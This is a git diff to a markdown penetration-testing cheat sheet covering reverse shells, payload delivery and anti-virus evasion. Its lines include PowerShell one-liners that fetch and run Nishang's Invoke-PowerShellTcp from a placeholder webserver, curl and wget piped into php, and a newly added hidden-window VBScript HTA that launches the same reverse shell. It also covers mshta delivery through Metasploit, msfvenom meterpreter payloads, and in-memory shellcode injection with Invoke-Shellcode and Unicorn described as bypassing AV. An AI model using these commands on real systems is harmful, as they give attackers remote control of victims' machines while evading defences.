@@ -240,11 +240,11 @@ which can be done using python:
 python -m SimpleHTTPServer <PORT>
 ```
 
-###### Powershell  
+###### PowerShell  
 
-The Nishang powershell scripts can be used to get a reverse shell.
+The Nishang PowerShell scripts can be used to get a reverse shell.
 https://github.com/samratashok/nishang  
-The following commands will load directly in memory the powershell script hosted
+The following commands will load directly in memory the PowerShell script hosted
 on the remote webserver:
 
 ```powershell
@@ -252,7 +252,7 @@ on the remote webserver:
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
 
 # ICMP - Needs a ICMP listener
-powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>"
 ```
 
 The Powershell script can also be started directly upon download if the invoke
@@ -285,9 +285,36 @@ system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php'
 system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
+####### [Windows] HTML Application
+
+Windows HTML Application script can contain JavaScript or VBScript that will be
+interpreted by the operating system.
+
+The HTA script can be interpreted through `Internet Explorer` or the Windows
+utility `mshta.exe`. As the file is not written on disk but directly
+interpreted from the remote URL, this technique can be used to bypass
+some anti-virus solutions.
+
+The following HTA script can be used to load in memory and execute the Nishang PowerShell `Invoke-PowerShellTcp` cmdlet:
+
+```
+<script language="VBScript">
+  window.moveTo -4000, -4000
+  Set eWZ3pL4 = CreateObject("Wscript.Shell")
+  Set gOhlGr = CreateObject("Scripting.FileSystemObject")
+  For each path in Split(eWZ3pL4.ExpandEnvironmentStrings("%PSModulePath%"),";")
+    If gOhlGr.FileExists(path + "\..\powershell.exe") Then
+      eWZ3pL4.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>",0
+      Exit For
+    End If
+  Next
+  window.close()
+</script>
+```
+
 #### Binary
 
-###### Linux C binary for SUID shell
+###### [Linux] C binary for SUID shell
 
 The following code can be compiled to get a binary that will spawn a shell with
 out dropping the SID bit. Change the owner of the binary if needed
@@ -465,7 +492,7 @@ msf> set ExitOnSession false
 msf> exploit -j -z
 ```
 
-###### MsfVenom
+###### MsfVenom & MSFPC
 
 The metasploit framework msfvenom is a powerful standalone payload generator.
 
@@ -565,7 +592,7 @@ msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST
 *Invoke-Shellcode*
 
 The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
-on the target through powershell and in memory execution. This can be used to
+on the target through PowerShell and in memory execution. This can be used to
 bypass AV detection.
 
 The commands to generate a payload, download and execute it on the target are
@@ -589,6 +616,28 @@ msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
 ```
 
+###### HTML Application
+
+Windows HTML Application script can contain JavaScript or VBScript that will be
+interpreted by the operating system.
+
+The `metasploit` module `exploit/windows/misc/hta_server` can be used to
+generate then host a HTA script that will launch a payload through PowerShell
+when interpreted.
+
+The HTA script can be interpreted through `Internet Explorer` or the Windows
+utility `mshta.exe`. As the file is not written on disk but directly
+interpreted from the remote URL, this technique can be used to bypass
+some anti-virus solutions.
+
+```
+msf> use exploit/windows/misc/hta_server
+[...]
+
+mshta.exe http://<HOSTNAME | IP>:<PORT>/<FILENAME>.hta
+```
+
+
 ###### Binary
 
 The following C code can be used to compile a binary that will escape some
@@ -604,7 +653,7 @@ int main() {
 }
 ```
 
-### Anti-Virus bypass
+### Anti-Virus bypass tools
 
 ###### (Windows / PowerShell) Unicorn
 
@@ -614,11 +663,11 @@ shellcode (custom, cobalt or meterpreter) straight into memory.
 *Ensure Metasploit is installed if using Metasploit methods.*
 
 If using meterpreter payloads the script will generate two files :
- - powershell_attack.txt
+ - PowerShell_attack.txt
  - unicorn.rc
 
 The text file contains all of the code needed in order to inject the
-powershell attack into memory and the rc file can be used to start a metesploit
+PowerShell attack into memory and the rc file can be used to start a metesploit
 reverse handler.
 
 The commands are as follow:
@@ -629,7 +678,7 @@ python unicorn.py windows/meterpreter/reverse_http <HOST_IP> <HOST_PORT>
 msfconsole -r unicorn.rc
 
 # On target
-# Execute the powershell command contained in the powershell_attack.txt file
+# Execute the PowerShell command contained in the powershell_attack.txt file
 ```
 
 ###### (Windows / binary) Shellter
